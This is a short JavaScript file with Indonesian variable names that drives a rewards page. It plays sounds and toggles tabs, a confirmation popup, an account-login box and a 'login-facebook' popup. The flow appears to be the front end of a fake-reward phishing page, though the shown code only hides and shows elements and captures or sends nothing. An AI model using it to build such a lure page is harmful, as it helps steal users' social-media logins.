// code for activate clicked sound
var buka = new Audio();
buka.src = "audio/open_reward_tab.mp3";

const audio1 = new Audio("audio/open_reward_tab.mp3");

var tutup = new Audio();
tutup.src = "audio/close_reward_popup.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
  var i, tab_rewards, tab_rewards_link;
  tab_rewards = document.getElementsByClassName("tab_rewards");
  for (i = 0; i < tab_rewards.length; i++) {
    tab_rewards[i].style.display = "none";
  }
  tab_rewards_link = document.getElementsByClassName("menu-content");
  for (i = 0; i < tab_rewards_link.length; i++) {
    tab_rewards_link[i].className = tab_rewards_link[i].className.replace(
      " menu-content-active",
      ""
    );
  }
  document.getElementById(rewardsClass).style.display = "block";
  evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_rewardsBox() {
  $(".rewardsBox").show();
  $(".rewardsHome").hide();
}
function open_itemReward_confirmation(ag) {
  var itemReward_confirmationImg = $(ag).attr("src");
  $(".itemReward_confirmation").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
  var otherReward_confirmationImg = $(ag).attr("src");
  var otherReward_confirmationValue = $(ag).attr("value");
  $(".otherReward_confirmation").show();
  $("#myOtherReward_confirmationImg").attr("src", otherReward_confirmationImg);
  $("#otherReward_confirmationValue").html(otherReward_confirmationValue);
}
function open_account_login() {
  audio1.play();
  $(".account_login").show();
  $(".itemReward_confirmation").hide();
  $(".otherReward_confirmation").hide();
}
function open_facebook() {
  buka.play();
  $(".login-facebook").show();
  $(".account_login").hide();
}

function close_reward_confirmation() {
  $(".itemReward_confirmation").hide();
  $(".otherReward_confirmation").hide();
}
function tutup_facebook() {
  tutup.play();
  $(".login-facebook").hide();
  $(".account_login").show();
}
